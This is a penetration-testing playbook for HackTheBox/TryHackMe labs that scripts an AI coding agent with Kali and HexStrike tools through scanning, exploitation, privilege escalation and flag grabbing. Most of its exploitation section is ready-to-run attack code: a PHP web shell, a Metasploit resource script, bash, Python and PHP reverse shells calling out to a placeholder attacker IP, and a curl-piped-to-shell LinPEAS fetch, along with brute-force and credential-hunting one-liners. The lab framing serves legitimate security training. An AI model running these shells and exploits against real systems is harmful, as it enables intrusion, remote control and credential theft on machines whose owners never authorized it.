# PLAYBOOK: CTF & HackTheBox / TryHackMe
# April 2026 Red Team Stack
# Average time savings: ~60% vs fully manual

---

## Initial Setup (Every Machine)

```bash
# Create loot directory
mkdir -p loot/$(hostname)/

# Set target
export TARGET_IP=[MACHINE_IP]
export TARGET_NAME=[MACHINE_NAME]
```

**Prompt to Claude Code:**
```
I'm working on [MACHINE_NAME] ([PLATFORM]) — fully authorized CTF/lab environment.
Target IP: [TARGET_IP]

Load playbooks/ctf-htb.md and begin.
Start with PentestThinkingMCP attack path planning, then HexStrike enumeration.
```

---

## PHASE 1 — MCTS ATTACK PLANNING

```
Using PentestThinkingMCP, plan the attack path for:
- Target: [TARGET_IP]
- Platform: HackTheBox / TryHackMe / CTF
- Known info: [any nmap output or hints]
Use Beam Search width=5, depth=8.
```

---

## PHASE 2 — FULL PORT SCAN (HexStrike / Kali MCP)

```
# Quick scan (top 1000)
Using hexstrike-ai: nmap -sV --open [TARGET_IP]

# Full scan (all ports) — run in background via Kali MCP tmux
kali_tmux_new("fullscan")
kali_tmux_send("fullscan", f"nmap -p- --min-rate 5000 -T4 {TARGET_IP} -oA loot/{TARGET_NAME}/full_scan")
```

**Document every open port — check:**
- HTTP/HTTPS: version, server headers, robots.txt, source code
- SSH: version (check for old vulns), try default creds
- FTP: anonymous login (`ftp [IP]` → user: `anonymous`)
- SMB: `smbclient -L //[IP]/`, check for null sessions
- SNMP: `snmpwalk -v2c -c public [IP]`
- Custom ports: banner grab them all

---

## PHASE 3 — WEB ENUMERATION (HexStrike)

**If HTTP/HTTPS found:**
```
Using hexstrike-ai web profile:
1. gobuster/ffuf dir brute-force on port [PORT]
   Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
2. whatweb + wappalyzer fingerprint
3. nikto scan
4. If CMS detected: wpscan / droopescan
5. Check for /robots.txt, /.git/, /.env, /backup
```

---

## PHASE 4 — EXPLOITATION DECISION TREE

```
SERVICE FOUND → TRY IN ORDER:
  
Web App:
  → Directory traversal / LFI
  → SQLi (sqlmap --crawl=2)
  → Default credentials (admin:admin, admin:password)
  → RCE via upload / template injection
  → Known CVE (searchsploit [framework] [version])

SSH:
  → Wordlist brute (hydra if allowed)
  → Captured credentials from web
  → Key from .ssh/ if LFI succeeded

SMB:
  → smbclient //[IP]/[SHARE] -N
  → crackmapexec smb [IP] --shares
  → Check for writable shares

FTP:
  → Anonymous login
  → Brute force if allowed
  → Check for interesting files
```

---

## PHASE 5 — EXPLOIT EXECUTION (Kali MCP)

### Web Shell Upload
```python
# If file upload found — try these extensions
extensions = ['.php', '.php5', '.phtml', '.php.jpg', '.pHp', '.PHP']
# PHP web shell
shell = '<?php system($_GET["cmd"]); ?>'
# Test: [URL]/uploads/shell.php?cmd=id
```

### Metasploit via Kali MCP
```
# Example: exploiting a known CVE
kali_msf_search("exploit/[SERVICE]/[VULN]")

# Create resource script
kali_write_file("/tmp/exploit.rc", """
use exploit/[MODULE]
set RHOSTS [TARGET_IP]
set LHOST [YOUR_IP]
set LPORT 4444
run
""")
kali_msf_run("/tmp/exploit.rc")
```

### Reverse Shell Listeners
```bash
# Netcat
nc -lvnp 4444

# Rlwrap for better shell
rlwrap nc -lvnp 4444
```

### Common Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("[YOUR_IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## PHASE 6 — PRIVESC (After Initial Shell)

```
Using Kali MCP after shell obtained:

# Stabilize shell first
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
[Ctrl+Z]
stty raw -echo; fg

# Run LinPEAS
curl -L https://linpeas.sh | sh 2>&1 | tee /tmp/lpe.txt

# Or upload manually
kali_write_file("/tmp/linpeas.sh", [LINPEAS_CONTENT])
```

**Common privesc paths (in order of frequency on HTB):**
1. SUID binaries → GTFObins
2. Sudo -l → GTFObins
3. Writable cron job
4. Writable service file / PATH hijack
5. World-writable script called by root cron
6. Kernel exploit (last resort — can crash box)
7. Docker group / LXD group
8. NFS no_root_squash
9. Password in config/history/backup files

---

## FLAG COLLECTION

```bash
# User flag
cat /home/*/user.txt 2>/dev/null
find / -name user.txt 2>/dev/null

# Root flag
cat /root/root.txt 2>/dev/null
find / -name root.txt 2>/dev/null
```

---

## Useful One-Liners

```bash
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# Find passwords in files
grep -rn "password" /etc/ 2>/dev/null
grep -rn "passwd" /var/www/ 2>/dev/null

# Check running services
ps aux | grep -v "\["
netstat -tulpn 2>/dev/null || ss -tulpn

# List crons
cat /etc/crontab
ls -la /etc/cron.*
crontab -l 2>/dev/null
```

---

*April 2026 | HTB/THM authorized lab use*
